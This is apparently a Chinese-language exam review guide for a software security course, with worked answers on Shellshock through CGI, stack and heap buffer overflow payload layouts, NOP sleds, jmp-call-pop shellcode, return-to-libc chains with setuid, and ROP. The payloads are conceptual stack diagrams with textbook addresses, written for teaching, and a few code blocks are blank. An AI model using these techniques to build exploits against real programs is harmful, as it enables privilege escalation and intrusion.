但是如果 PHP 程序或服务器配置显式把 `User-Agent` 放进环境变量，并且这个环境变量传给了有漏洞的 Bash，那么 PHP 情况也可能触发。

所以两种情况的区别是：

```text
CGI：
HTTP 请求字段自动进入 CGI 环境变量，更容易触发。

PHP Apache 模块：
HTTP 请求字段通常在 PHP 内部变量中，不一定进入 shell 环境变量。
```

利用 Shellshock 的共同条件仍然是：

```text
1. 攻击者输入必须进入 Bash 的环境变量。
2. 目标必须启动存在漏洞的 Bash。
```

-PPT对应位置：
看 PPT 中 **“对 CGI 程序的攻击”**、**“如何使攻击载荷进入 CGI 程序”**、**“Shellshock 对 CGI 程序的攻击”**。

-复习重点：
CGI 的危险在于：**HTTP 头字段会自动变成环境变量**。
PHP 模块中请求头通常只是 PHP 变量，不一定传给 Bash 环境。

## S4.1

1. 下面代码中变量 `a` 和 `x` 的地址是如何决定的？也就是说，在程序运行时，程序怎么知道这两个变量的地址？

```c
void foo(int a)
{
    int x;
}
```

-答案：
`a` 和 `x` 的地址都由函数的栈帧决定。编译器在编译时确定它们相对于栈帧指针 `ebp/rbp` 或栈指针 `esp/rsp` 的偏移量；程序运行时通过这些固定偏移量访问它们。

-详细解释：
函数调用时，系统会为 `foo()` 创建一个新的栈帧。这个栈帧里通常包含：

```text
函数参数
返回地址
保存的旧 frame pointer
局部变量
```

参数 `a` 是函数参数，一般位于返回地址上方的位置；局部变量 `x` 位于当前函数栈帧内部，通常在保存的 frame pointer 下方。

编译器会把访问变量的代码翻译成类似：

```text
a = [ebp + 某个偏移]
x = [ebp - 某个偏移]
```

所以程序不是在运行时“查名字”找变量，而是通过栈帧基准地址加偏移量访问变量。

-PPT对应位置：
看 PPT 中 **“函数调用栈”**、**“函数参数在栈中的顺序”**、**“程序（进程）的内存布局”**。

-复习重点：
局部变量和函数参数通常在栈上；编译器用相对于 frame pointer 的偏移量定位它们。

## S4.2

2. 下面代码中的变量分别位于哪些内存段？

```c
int i = 0;

void func(char *str)
{
    char *ptr = malloc(sizeof(int));
    char buf[1024];
    int j;
    static int y;
}
```

-答案：

```text
i                      全局/静态存储区，通常在 data 或 BSS 段
str                    函数参数，位于栈上
ptr                    局部指针变量本身在栈上
malloc(sizeof(int))    malloc 分配出来的内存在堆上
buf[1024]              局部数组，在栈上
j                      局部变量，在栈上
y                      static 局部变量，在 BSS 段
```

-详细解释：
逐个看：

`int i = 0;` 是全局变量，具有静态存储期。概念上它属于全局数据区。由于它初始化为 0，很多系统会把它放在 BSS 段；有些教材会把“已初始化全局变量”统一归为 data 段。考试中可以说明：它不在栈上，也不在堆上，而是在全局/静态存储区。

`str` 是函数参数，函数调用时位于栈帧中。

`ptr` 是局部变量，所以指针变量 `ptr` 本身在栈上。

但是：

```c

```

分配出来的那块内存在堆上，`ptr` 只是指向这块堆内存。

`static int y;` 是静态局部变量，它不会随着函数调用结束而销毁，生命周期贯穿整个程序。由于没有显式非零初始化，默认初始化为 0，通常放在 BSS 段。

看 PPT 中 **“程序（进程）的内存布局”**，里面区分了数据段、BSS、堆和栈。

-复习重点：
记住：

```text
局部变量       栈
函数参数       栈
malloc 内存    堆
全局变量       数据段/BSS
static 变量    数据段/BSS
```

```text
低地址
```

-详细解释：
函数 `bof()` 被调用时，会创建自己的栈帧。参数 `str` 位于调用者压入的参数区域；返回地址用于记录 `bof()` 执行完后回到哪里继续执行；保存的旧 `ebp` 用于函数返回时恢复调用者的栈帧；`buffer[24]` 是局部变量，位于当前函数栈帧内部。

由于很多系统中栈从高地址向低地址增长，而 `strcpy(buffer, str)` 会从 `buffer` 的起始位置不断向高地址方向写入数据，如果 `str` 太长，就可能覆盖保存的 `ebp` 和返回地址。

-PPT对应位置：
看 PPT 中 **“函数调用栈”**、**“存在漏洞的程序”**、**“缓冲区溢出的后果”**。

-复习重点：
栈溢出攻击的关键是：局部 buffer 太小，超长输入可能覆盖返回地址。

## S4.4

4. 有学生建议改变栈的增长方向。原来栈从高地址向低地址增长，现在改成从低地址向高地址增长。这样 buffer 会被分配在返回地址上方，所以 buffer 溢出就无法影响返回地址。请评论这个建议。

-答案：
这个建议不能从根本上解决缓冲区溢出问题。

-详细解释：
改变栈增长方向可能让某一种特定布局下的 buffer 溢出不容易覆盖返回地址，但这不是完整防御。

原因包括：

```text
1. 攻击者不一定只攻击返回地址，也可以攻击函数指针、局部变量、参数、对象指针等。
2. 其他类型的越界写，例如向低地址方向写，仍可能破坏控制数据。
3. 堆溢出、全局变量溢出等不受栈增长方向影响。
4. 编译器和 ABI 仍可能以不同顺序安排变量，不能保证所有 buffer 都远离控制数据。
5. 改变栈增长方向会影响系统 ABI 和兼容性，代价很大。
```

所以它最多缓解某些特定情况，不能作为通用防御。更实际的防御包括：

```text
边界检查
安全字符串函数
StackGuard/canary
ASLR
NX 不可执行栈
```

-PPT对应位置：
看 PPT 中 **“缓冲区溢出的后果”** 和 **“应对措施”**。

-复习重点：
缓冲区溢出的本质是越界写；改变栈方向不能消除越界写本身。

## S4.5

5. 在书中的缓冲区溢出例子中，溢出发生在 `strcpy()` 函数内部，所以跳转到恶意代码是在 `strcpy()` 返回时发生的，而不是在 `foo()` 返回时发生的。这个说法正确还是错误？请解释。

-答案：
错误。跳转到恶意代码通常发生在 `foo()` 或 `bof()` 返回时，而不是 `strcpy()` 返回时。

-详细解释：
虽然真正执行越界写的是：

```c
strcpy(buffer, str);
```

但是 `strcpy()` 写入的目标是调用者栈帧中的 `buffer`。也就是说，它破坏的是 `foo()` 或 `bof()` 的栈帧，而不是 `strcpy()` 自己的栈帧。

攻击者通常覆盖的是 `foo()` 或 `bof()` 栈帧中的返回地址。`strcpy()` 执行完后会正常返回到 `foo()` 或 `bof()`。等 `foo()` 或 `bof()` 最后执行 `return` 时，CPU 会从被覆盖的返回地址中取出跳转目标，于是跳到攻击者指定的恶意代码。

所以顺序是：

```text
strcpy() 执行越界写
        ↓
strcpy() 正常返回
        ↓
bof()/foo() 继续执行
        ↓
bof()/foo() return
        ↓
使用被覆盖的返回地址
        ↓
跳转到恶意代码
```

-PPT对应位置：
看 PPT 中 **“恶意代码如何被执行”**。

-复习重点：
溢出发生在 `strcpy()` 中，但控制流劫持通常在被溢出的函数返回时发生。

## S4.6

6. 下面这样修复缓冲区溢出问题安全吗？

```c
int bof(char *str, int size)
{
    char *buffer = (char *) malloc(size);
    strcpy(buffer, str);
    return 1;
}
```

-答案：
不安全。

-详细解释：
这段代码只是把 buffer 从栈移动到了堆上，但仍然没有检查 `str` 的长度。

`malloc(size)` 只分配了 `size` 字节，但：

```c
strcpy(buffer, str);
```

会一直复制，直到遇到字符串结束符 `\0`。如果 `str` 的长度大于 `size - 1`，仍然会发生溢出，只不过这次是 **堆溢出**，不是栈溢出。

安全做法应该是：

```text
1. 检查 strlen(str) 是否小于 size
2. 为字符串结尾的 \0 预留空间
3. 使用有长度限制的函数
4. 避免直接使用 strcpy()
```

例如概念上应保证：

```text
strlen(str) + 1 <= size
```

否则不能复制。

-PPT对应位置：
看 PPT 中 **“存在漏洞的程序”** 和 **“应对措施：开发者方法”**。

-复习重点：
把 buffer 放到堆上不等于安全；核心是必须检查边界。

## S4.7

7. 几个学生构造了正确的 `badfile`，shellcode 放在 `badfile` 末尾。但是尝试不同返回地址时结果如下。请解释为什么有些地址成功，有些失败。

```text
buffer address : 0xbffff180

case 1 : retAddr = 0xbffff250 -> Able to get shell access
case 2 : retAddr = 0xbffff280 -> Able to get shell access
case 3 : retAddr = 0xbffff300 -> Cannot get shell access
case 4 : retAddr = 0xbffff310 -> Able to get shell access
case 5 : retAddr = 0xbffff400 -> Cannot get shell access
```

-答案：
因为返回地址必须落在有效的 NOP sled 或 shellcode 区域中。落在这些区域就可能成功；落在无效地址、空洞、非法指令区或 shellcode 外部就会失败。

-详细解释：
攻击载荷通常长这样：

```text
NOP NOP NOP NOP ... NOP shellcode
```

如果返回地址跳到 NOP sled 中，CPU 会一路执行 NOP，最后滑到 shellcode，因此攻击成功。

如果返回地址直接跳到 shellcode 开头或某个仍然有效的位置，也可能成功。

但是如果返回地址跳到：

```text
1. 没有映射的内存区域
2. shellcode 后面
3. 非指令数据
4. shellcode 中间的错误位置
5. 不可执行区域
```

程序就会崩溃或攻击失败。

所以 case 1、2、4 成功，说明这些地址可能落在 NOP sled 或有效 shellcode 区域；case 3、5 失败，说明这些地址没有落在可成功执行的位置。

-PPT对应位置：
看 PPT 中 **“任务 B：恶意代码的地址”**、**“NOP 指令填充”**、**“Badfile 文件内容”**。

-复习重点：
返回地址不需要精确指向 shellcode 第一条指令，只要落在 NOP sled 中也能成功。

## S4.8

8. 下面函数在一个特权程序中被调用。参数 `str` 完全由用户提供，最多 300 字节。函数调用时，`buffer` 的地址是 `0xAABB0010`，返回地址存储在 `0xAABB0050`。请写出你会提供给程序的字符串，使得复制到 `buffer` 后，`bof()` 返回时执行你的代码。不需要写出具体恶意代码，但关键元素偏移必须正确。注意：这题有陷阱。

```c
int bof(char *str)
{
    char buffer[24];
    strcpy(buffer,str);
    return 1;
}
```

-答案：
返回地址字段相对于 `buffer` 起始地址的偏移是：

```text
0xAABB0050 - 0xAABB0010 = 0x40 = 64
```

所以输入应满足：

```text
offset 0   - 63    填充数据 / NOP
offset 64  - 67    新返回地址
offset 68  - 255   填充数据 / NOP
offset 256 开始    malicious code
```

新返回地址不能直接使用 `0xAABB0010`，因为它的小端表示中含有 `0x00`，会导致 `strcpy()` 提前停止。可以把恶意代码放在偏移 256 之后，例如地址：

```text
0xAABB0010 + 0x100 = 0xAABB0110
```

然后在 offset 64 处写入：

```text
0xAABB0110
```

小端字节顺序为：

```text
\x10\x01\xBB\xAA
```

-详细解释：
首先计算从 `buffer` 到返回地址的距离：

```text
buffer 起始地址        0xAABB0010
返回地址存储位置      0xAABB0050
距离                  0x40 = 64
```

因此输入的第 64 到 67 字节会覆盖返回地址。

陷阱在于 `strcpy()` 会在遇到 `\0` 时停止复制。
如果我们把返回地址设为 `0xAABB0010`，小端存储是：

```text
\x10\x00\xBB\xAA
```

其中包含 `\x00`，会导致复制提前结束，攻击字符串后面的内容无法被复制。

所以不能选择带 0 字节的地址。

可以把 shellcode 放到更后面，例如 offset 256，对应地址：

```text
0xAABB0110
```

小端形式是：

```text
\x10\x01\xBB\xAA
```

不包含 0 字节，因此适合作为覆盖返回地址的值。

-PPT对应位置：
看 PPT 中 **“创建攻击载荷 badfile”**、**“任务 A：缓冲区基址与返回地址之间的偏移量”**、**“注意事项：地址中不应包含零”**。

-复习重点：
这题关键有两个：

```text
1. 返回地址偏移 = 64
2. 不能使用包含 0 字节的地址，因为 strcpy() 会提前停止
```

## S4.9

9. 这题研究堆上的 buffer overflow 如何导致恶意代码执行。已知：

```text
buffer 地址 Address A = 0x804B2220
Node p 地址 Address B = 0x804B22C0
返回地址位置 = 0xBBFFAACC
```

代码片段：

```c
struct Node
{
    struct Node *next;
    struct Node *pre;
};

struct Node *p = malloc(sizeof(struct Node));
struct Node *q;
char *buffer = malloc(100);

/* Add Node p to a linked list */

strcpy(buffer, user_input);

q = p->pre;
q->next = p->next;
return;
```

请构造输入，使程序执行到 Line ➌ `return` 时跳到你注入在堆上的恶意代码。

-答案：
构造思路是利用 `q->next = p->next` 这条语句，把返回地址位置 `0xBBFFAACC` 改成恶意代码地址。

输入布局可以是：

```text
offset 0 开始          malicious code / NOP sled
offset 160 - 163       p->next = 0x804B2220
offset 164 - 167       p->pre  = 0xBBFFAACC
```

因为：

```text
0x804B22C0 - 0x804B2220 = 0xA0 = 160
```

所以从 `buffer` 起始地址溢出 160 字节后，会覆盖到 `p->next`。
因为 buffer 和 p 都在堆上，buffer 溢出后可以覆盖 p->next 和 p->pre。
程序随后执行 q = p->pre; q->next = p->next。
令 p->pre = 返回地址的位置，p->next = 恶意代码地址。
这样 q->next = p->next 就会把恶意代码地址写入返回地址。
函数 return 时跳到恶意代码。

-详细解释：
原本结构体：

```c
struct Node
{
    struct Node *next;
    struct Node *pre;
};
```

所以：

```text
p->next 位于 0x804B22C0
p->pre  位于 0x804B22C4
```

程序执行：

```c
q = p->pre;
q->next = p->next;
```

如果我们通过堆溢出把：

```text
p->pre  = 0xBBFFAACC
p->next = 0x804B2220
```

那么：

```c
q = p->pre;
```

会使：

```text
q = 0xBBFFAACC
```

接下来：

```c
q->next = p->next;
```

由于 `next` 是结构体第一个字段，偏移为 0，所以这条语句等价于：

```text
*(0xBBFFAACC) = 0x804B2220
```

也就是把函数返回地址改成 `0x804B2220`，而这个地址正好是我们在 heap buffer 中放置恶意代码的位置。

于是函数 `return` 时，就会跳到堆上的恶意代码。

-PPT对应位置：
看 PPT 中 **“堆的内存布局”**、**“缓冲区溢出攻击”**，以及 PDF 第 3 页图 1 中的 heap buffer 和 Node p 布局。

-复习重点：
这题不是直接用溢出覆盖栈上的返回地址，而是利用链表操作实现“任意地址写”。

## S4.11

11. 为什么 ASLR 会让缓冲区溢出攻击变得更困难？

-答案：
因为 ASLR 会随机化栈、堆、共享库等内存区域的地址，使攻击者难以预测 shellcode、buffer 或库函数的准确地址。

-详细解释：
经典缓冲区溢出攻击需要把返回地址改成某个目标地址，例如：

```text
shellcode 的地址
NOP sled 的地址
system() 函数的地址
```

如果地址固定，攻击者可以通过调试或猜测构造攻击载荷。

ASLR 开启后，程序每次运行时，栈、堆、库等地址可能不同。例如 buffer 这次在：

```text
0xbffff180
```

下次可能在：

```text
0xbfffe930
```

攻击者不知道应该把返回地址改成什么，攻击成功率下降。

不过 ASLR 不是绝对防御。如果随机化空间很小，攻击者可能通过反复尝试、信息泄露或 NOP sled 提高成功率。

-PPT对应位置：
看 PPT 中 **“ASLR 原理”**、**“地址空间布局随机化”**。

-复习重点：
ASLR 保护的是地址不可预测性；攻击者最需要的就是准确跳转地址。

## S4.12

12. 写 shellcode 时，我们需要知道字符串 `"/bin/sh"` 的地址。如果在代码中硬编码这个地址，开启 ASLR 后会变困难。`exploit.c` 中的 shellcode 是如何不硬编码地址而解决这个问题的？

-答案：
shellcode 使用了 `jmp-call-pop` 技巧，在运行时动态获得 `"/bin/sh"` 字符串的地址，而不是硬编码地址。

-详细解释：
shellcode 通常会把字符串 `"/bin/sh"` 放在代码末尾。问题是：由于 ASLR，攻击者不知道这段字符串运行时的绝对地址。

`jmp-call-pop` 的思想是：

```text
1. 先 jmp 跳到后面的 call 指令
2. call 调回前面的代码
3. call 指令会把下一条指令地址压入栈
4. 下一条指令地址正好是字符串 "/bin/sh" 的地址
5. 前面的代码用 pop 指令把这个地址取出来
```

所以过程类似：

```asm
jmp two

one:
    pop ebx      ; ebx 得到 "/bin/sh" 的运行时地址
    ...

two:
    call one
    db "/bin/sh"
```

这样 shellcode 不需要提前知道 `"/bin/sh"` 的绝对地址。它通过 `call` 指令自动把字符串地址压栈，再通过 `pop` 取出来。

-PPT对应位置：
看 PPT 中 **“Shellcode”**、**“用于开启 shell 的汇编代码”**。

-复习重点：
`jmp-call-pop` 技巧用于在 shellcode 中动态获得字符串地址，从而适应地址随机化。

## S4.14

14. 下面函数运行在远程服务器中。参数 `str` 完全由用户提供，最多 300 字节。`buffer` 的大小是未知的 `X`，不能调试远程服务器。但我们知道：

```text
buffer 地址 = 0xAABBCC10

X 的范围 = 20 到 100
```

请构造一次性输入，使得无论 `X` 的准确值是多少，都能尽量成功执行你的代码。不需要写具体恶意代码，但关键元素偏移必须正确。

-答案：
返回地址相对 `buffer` 的偏移是：


因为：

```text
X 范围是 20 到 100
```

所以返回地址偏移范围是：

```text
28 到 108
```

可以构造输入：

```text
offset 0   - 27      NOP
offset 28  - 111     重复写入同一个返回地址，例如 0xAABBCCB0
offset 112 - 219     NOP sled
offset 220 开始      malicious code
```

其中：

```text
0xAABBCCB0 = buffer 起始地址 0xAABBCC10 + 0xA0
```

该地址位于我们输入中的 NOP sled 区域，且小端表示：

```text
\xB0\xCC\xBB\xAA
```

不包含 0 字节。

-详细解释：
由于 `buffer` 大小未知：

```text
X ∈ [20, 100]
```

返回地址字段的位置是：

```text
buffer 起始 + X + 8
```

所以偏移范围是：

```text
20 + 8 = 28
100 + 8 = 108
```

也就是说，返回地址可能出现在输入的 offset 28 到 108 之间。

我们不知道准确位置，所以可以在这个范围内反复填入同一个目标地址：

```text
0xAABBCCB0
```

该地址指向输入中靠后的 NOP sled。只要真实返回地址位置落在这些重复地址覆盖的区域中，函数返回时就会跳到 NOP sled，然后滑到后面的 malicious code。

输入布局可以理解为：

```text
0 - 27:
    NOP

28 - 111:
    重复 0xAABBCCB0
    例如每 4 字节写一次：
    offset 28:  0xAABBCCB0
    offset 32:  0xAABBCCB0
    offset 36:  0xAABBCCB0
    ...
    offset 108: 0xAABBCCB0

112 - 219:
    NOP sled

220 以后:
    malicious code
```

这样即使不知道 `X` 的准确值，只要返回地址落在我们重复覆盖的范围内，就有机会被改成 `0xAABBCCB0`。

注意：这个构造通常基于栈地址按 4 字节对齐的假设。如果返回地址可能出现在任意字节偏移上，理论上很难用普通重复 4 字节地址保证所有情况都成功。但在这类教材题中，通常默认返回地址按 word 对齐。

-PPT对应位置：
看 PPT 中 **“任务 A：缓冲区基址与返回地址之间的偏移量”**、**“NOP sled”**、**“Badfile 文件内容”**。

-复习重点：
当 buffer 大小未知时，思路是：

```text
1. 找出返回地址可能出现的偏移范围
2. 在这个范围内重复填入目标地址
3. 让目标地址指向后方较大的 NOP sled
4. 把 shellcode 放在 NOP sled 后面
```

## S5.1

1. 使用 `-z noexecstack` 选项编译 C 程序后，原本返回到栈上代码的 buffer overflow 攻击应该失败，但有些学生发现攻击仍然成功。学生操作都正确，可能原因是什么？

-答案：
可能原因是 **不可执行栈机制没有真正生效**。例如硬件或操作系统没有启用 NX 支持，或者程序/共享库的某些设置导致栈仍然是可执行的。

-详细解释：
`-z noexecstack` 的作用是告诉链接器：这个程序不需要可执行栈。这样系统加载程序时，会尽量把栈标记为不可执行。

但是这个选项本身只是一个标记，真正能不能阻止栈上代码执行，还取决于：

```text
1. CPU 是否支持 NX bit
2. 操作系统是否启用了不可执行栈保护
3. 程序或某些共享库是否要求 executable stack
4. 运行环境是否正确执行了这个保护策略
```

所以如果攻击仍然成功，通常说明栈实际上仍然可以执行。也就是说，虽然编译时使用了 `-z noexecstack`，但运行时并没有真正阻止 CPU 执行栈上的 shellcode。

-PPT对应位置：
看 PPT 中 **“不可执行堆栈”** 和 **“使用不可执行堆栈”** 部分。

-复习重点：
`-z noexecstack` 不是魔法，它需要硬件和操作系统共同支持。防御是否有效，要看运行时栈是否真的不可执行。

## S5.2

2. 在函数 epilogue 中，返回地址下面保存的 previous frame pointer 会被取出并赋给 `ebp`。但是当我们溢出返回地址时，previous frame pointer 区域也已经被修改了，所以函数 epilogue 后 `ebp` 会包含任意值。这有影响吗？

-答案：
通常不会影响 return-to-libc 攻击的成功。因为攻击目标函数，例如 `system()`，会在自己的函数序言中重新设置 `ebp`。即使旧 `ebp` 是任意值，只要栈上的返回地址和参数布置正确，攻击仍然可以成功。

-详细解释：
函数返回前通常会执行类似：

```asm
leave
ret
```

`leave` 大致相当于：

```asm
mov esp, ebp
pop ebp
```

如果 saved EBP 被覆盖，那么 `pop ebp` 后，`ebp` 可能变成攻击者输入中的某个任意值。

但是接下来 `ret` 会从栈上取出返回地址。如果攻击者已经把返回地址改成 `system()` 的地址，程序就会跳到 `system()`。

当 `system()` 开始执行时，它自己的函数序言通常会做：

```asm
push ebp
mov ebp, esp
```

也就是说，`system()` 会建立自己的栈帧。

因此，旧 `ebp` 是否正常恢复通常不是关键。真正关键的是：

```text
1. 返回地址是否被改成 system() 的地址
2. 栈上是否正确放置 system() 的返回地址
3. 栈上是否正确放置 system() 的参数，例如 "/bin/sh" 的地址
```

-PPT对应位置：
看 PPT 中 **“函数序言”**、**“功能结语”**、**“从 foo() 函数返回到 system() 函数的过程”**。

-复习重点：
return-to-libc 攻击重点是控制返回地址和参数。saved EBP 被破坏通常不影响攻击，除非后续代码还依赖它正常运行。

## S5.3

3. 不跳到 `system()`，我们想跳到 `execve()` 执行 `"/bin/sh"`。请描述如何做。允许输入中包含 0，因为假设使用 `memcpy()` 而不是 `strcpy()`。

-答案：
可以通过 buffer overflow 把返回地址改成 `execve()` 的地址，并在栈上布置好 `execve("/bin/sh", argv, envp)` 的三个参数。

-详细解释：
`execve()` 的函数形式是：

```c
execve(filename, argv, envp);
```

我们希望执行：

```c
execve("/bin/sh", argv, NULL);
```

其中：

```text
filename = "/bin/sh" 的地址
argv     = 一个参数数组的地址
envp     = NULL
```

`argv` 数组应该类似：

```text
argv[0] = "/bin/sh" 的地址
argv[1] = NULL
```

栈可以构造成：

```text
低地址
│
│  填充数据
│
│  execve() 的地址          ← 覆盖原返回地址
│
│  exit() 的地址            ← execve 如果失败后的返回地址
│
│  "/bin/sh" 的地址         ← 第 1 个参数 filename
│
│  argv 数组的地址          ← 第 2 个参数 argv
│
│  0x00000000               ← 第 3 个参数 envp
│
│  argv[0] = "/bin/sh" 地址
│  argv[1] = 0x00000000
│
高地址
```

因为题目允许输入中包含 0，所以我们可以直接放：

```text
0x00000000
```

这比 `strcpy()` 场景简单。因为如果使用 `strcpy()`，中间出现 `\x00` 会导致复制提前停止；但 `memcpy()` 不会因为 0 字节停止。

-PPT对应位置：
看 PPT 中 **“攻击概述”**、**“任务 C：system() 的输入参数”**，以及函数调用栈布局。

-复习重点：
`execve()` 需要 3 个参数。return-to-libc 的关键是把栈伪造成一次正常函数调用。

## S5.4

4. `system()` 会调用 `/bin/sh`，而 `/bin/sh` 是 `/bin/bash` 的符号链接。新版本 Bash 如果发现 effective user ID 和 real user ID 不同，会降低权限。假设我们仍然想在 Return-to-libc 攻击中使用 `system()`，应该如何克服这个问题？允许输入中包含 0。

-答案：
可以先调用 `setuid(0)` 或 `setreuid(0,0)`，把真实用户 ID 也设置为 0，然后再调用 `system("/bin/sh")`。这样 Bash 看到 RUID 和 EUID 都是 0，就不会因为二者不同而降权。

-详细解释：
Set-UID 程序中通常有：

```text
RUID = 普通用户
EUID = root
```

如果直接执行：

```c
system("/bin/sh");
```

Bash 发现：

```text
RUID != EUID
```

就可能主动把权限降为普通用户，导致拿不到 root shell。

解决办法是，在调用 `system()` 之前先调用：

```c
setuid(0);
```

这样进程变成：

```text
RUID = 0
EUID = 0
```

然后再执行：

```c
system("/bin/sh");
```

Bash 就不会因为 RUID/EUID 不一致而降权。

栈的思路可以是：

```text
先 return 到 setuid(0)
再 return 到 system("/bin/sh")
最后 return 到 exit()
```

如果要严格构造多函数链，通常需要一个类似 `pop; ret` 的 gadget 来清理 `setuid(0)` 的参数。概念布局可以写成：

```text
低地址
│
│  setuid() 地址             ← 第一次返回到 setuid
│
│  pop; ret gadget 地址      ← setuid 返回后清理参数 0
│
│  0x00000000                ← setuid 的参数
│
│  system() 地址             ← gadget ret 到 system
│
│  exit() 地址               ← system 返回后调用 exit
│
│  "/bin/sh" 的地址          ← system 的参数
│
高地址
```

-PPT对应位置：
看 PPT 中 **“击败 bash 和 dash 的反制措施”**，以及 **“链式函数调用，有含零参数的特殊处理”** 部分。

-复习重点：
Bash 降权的原因是 RUID 和 EUID 不一致。解决方法是先让真实 UID 也变成 0，再启动 shell。

## S5.5

5. 在 return-to-libc 攻击中，攻击者不跳到 `system()` 函数开头，而是跳到 `system()` 函数 prologue 后面的第一条指令。请描述攻击者应该如何构造输入数组。

-答案：
攻击者需要自己伪造好 `system()` 的栈帧。因为跳过了函数 prologue，`system()` 不会执行 `push ebp; mov ebp, esp`，所以攻击者必须让 `ebp` 已经指向一个伪造的 frame，使得 `ebp+8` 处正好是 `"/bin/sh"` 的地址。

-详细解释：
正常进入 `system()` 时，函数序言会执行：

```asm
push ebp
mov ebp, esp
```

然后 `system()` 用类似：

```text
8(%ebp)
```

的位置取参数。

但是题目说攻击者跳过函数 prologue，直接跳到 prologue 后面的第一条指令。这样 `system()` 不会自己设置新的 `ebp`。

所以我们需要提前控制 vulnerable function 的 saved EBP，使函数返回后：

```text
ebp = fake_ebp
```

并且在这个 fake frame 中布置：

```text
fake_ebp + 4 = exit() 的地址
fake_ebp + 8 = "/bin/sh" 的地址
```

构造大概是：

```text
低地址
│
│  buffer 填充
│
│  fake_ebp                  ← 覆盖 saved EBP
│
│  system() prologue 后地址  ← 覆盖返回地址
│
│  ...
│
│  fake_ebp + 4: exit() 地址
│  fake_ebp + 8: "/bin/sh" 地址
│
高地址
```

这样即使跳过了 `system()` 的函数序言，`system()` 后面的代码仍然能通过 `ebp+8` 找到参数 `"/bin/sh"`。

-PPT对应位置：
看 PPT 中 **“函数序言”**、**“功能结语”**、**“system() 参数”**。

-复习重点：
跳到函数开头时，函数会自己建立栈帧；跳过 prologue 时，攻击者必须自己伪造 `ebp` 和参数位置。

## S5.6

6. ASLR 能帮助防御 return-to-libc 攻击吗？

-答案：
能。ASLR 可以随机化 libc、栈、堆等内存区域的地址，使攻击者难以知道 `system()`、`exit()` 和 `"/bin/sh"` 的准确地址。

-详细解释：
return-to-libc 攻击需要知道几个关键地址：

```text
1. system() 的地址
2. exit() 的地址
3. "/bin/sh" 字符串的地址
```

如果 ASLR 关闭，这些地址比较稳定，攻击者可以通过调试或实验找出来。

如果 ASLR 开启，每次程序运行时，libc 加载位置、栈地址、环境变量地址都可能变化。攻击者即使知道 `system()` 在 libc 中的偏移，也不一定知道 libc 的基地址。

因此 ASLR 会显著增加 return-to-libc 攻击难度。

不过 ASLR 不是绝对防御。如果攻击者可以泄露地址，或者随机化空间很小，仍然可能绕过。

-PPT对应位置：
看 PPT 中 **“地址随机化”** 和 **“ASLR 对攻击的影响”** 相关部分。

-复习重点：
return-to-libc 依赖准确地址；ASLR 的作用就是让地址不可预测。

## S5.7

7. Linux 中的 ASLR 会随机化库函数地址，例如 `system()` 的地址吗？

-答案：
会。在启用 ASLR 的情况下，Linux 通常会随机化共享库的加载基地址，因此 `system()` 这类 libc 函数的绝对地址也会变化。

-详细解释：
`system()` 位于 libc 共享库中。函数本身在 libc 文件中的偏移是固定的，但 libc 被加载到进程虚拟地址空间中的基地址可能被随机化。

所以：

```text
system() 绝对地址 = libc 基地址 + system() 在 libc 中的偏移
```

如果 libc 基地址变了，`system()` 的绝对地址也会变。

不过要注意：

```text
1. 函数在 libc 内部的相对偏移不变
2. 变化的是 libc 的加载基地址
3. 如果 ASLR 关闭，地址通常稳定
4. 如果程序是静态链接或特殊配置，情况可能不同
```

-PPT对应位置：
看 PPT 中 **“ASLR”**、**“地址随机化对 libc 地址的影响”**。

-复习重点：
ASLR 随机化的是库的加载位置；函数偏移固定，但绝对地址会变。

## S5.8

8. 假设没有 `system()` 可以 return-to-libc，但我们知道指令序列 `A1...Am, B1...Bn, C1...Ct` 可以生成 shell。这些指令不是连续存放的，而是分布在三个以 `ret` 结尾的片段中：

```text
0xAABB1180: A1, ..., Am, ret
0xAABB2290: B1, ..., Bn, ret
0xAABB33A0: C1, ..., Ct, ret
```

我们已经把返回地址改成 `0xAABB1180`。还应该在栈上放什么，使 A 返回后跳到 B，B 返回后跳到 C？

-答案：
在栈上紧接着放：

```text
0xAABB2290
0xAABB33A0
```

这样 A 片段执行完 `ret` 后跳到 B，B 片段执行完 `ret` 后跳到 C。

-详细解释：
ROP 的核心是利用每个 gadget 末尾的 `ret`。

栈可以布置成：

```text
低地址
│
│  0xAABB1180     ← 覆盖原返回地址，先跳到 A
│
│  0xAABB2290     ← A 的 ret 会跳到这里，也就是 B
│
│  0xAABB33A0     ← B 的 ret 会跳到这里，也就是 C
│
│  后续地址或数据
│
高地址
```

执行过程是：

```text
1. 原函数 ret → 跳到 A: 0xAABB1180
2. A 执行 A1...Am
3. A 的 ret 从栈上取出 0xAABB2290
4. 跳到 B
5. B 执行 B1...Bn
6. B 的 ret 从栈上取出 0xAABB33A0
7. 跳到 C
8. C 执行 C1...Ct
```

这就是 ROP：不是注入新代码，而是把已有代码片段用 `ret` 串起来。

-PPT对应位置：
看 PPT 中 **“Return-Oriented Programming (ROP) 编程”**。

-复习重点：
ROP gadget 以 `ret` 结尾。栈上的下一个 word 决定下一个 gadget 的地址。

## S5.9

9. `foo()` 有 buffer overflow。我们想让它返回到下面的函数调用序列：

```text
bar() → bar() → bar() → xyz(3, 5) → exit()
```

假设我们知道这些函数地址。请描述如何利用 buffer overflow 构造栈，并画出栈图。

-答案：
把 `foo()` 的返回地址改成第一个 `bar()` 的地址，然后依次在栈上放第二个 `bar()`、第三个 `bar()`、`xyz()`、`exit()`、参数 `3` 和 `5`。

-详细解释：
`bar()` 没有参数，所以多个 `bar()` 可以直接用返回地址链起来。`xyz(3,5)` 有两个参数，所以在 `xyz()` 的返回地址后面放参数 `3` 和 `5`。

栈布局可以写成：

```text
低地址
│
│  buffer 填充
│
│  saved EBP
│
│  bar() 地址          ← foo 返回后先执行第 1 个 bar
│
│  bar() 地址          ← 第 1 个 bar 返回后执行第 2 个 bar
│
│  bar() 地址          ← 第 2 个 bar 返回后执行第 3 个 bar
│
│  xyz() 地址          ← 第 3 个 bar 返回后执行 xyz
│
│  exit() 地址         ← xyz 返回后执行 exit
│
│  3                   ← xyz 的第 1 个参数
│
│  5                   ← xyz 的第 2 个参数
│
高地址
```

执行过程：

```text
foo return → bar()
bar return → bar()
bar return → bar()
bar return → xyz(3,5)
xyz return → exit()
```

为什么 `xyz()` 能拿到参数？

当程序跳到 `xyz()` 时，栈顶附近是：

```text
exit() 地址
3
5
```

对于正常 32-bit cdecl 调用来说：

```text
[ebp+4]  = 返回地址，也就是 exit()
[ebp+8]  = 第 1 个参数，也就是 3
[ebp+12] = 第 2 个参数，也就是 5
```

所以 `xyz()` 会看到参数 `3` 和 `5`。

-PPT对应位置：
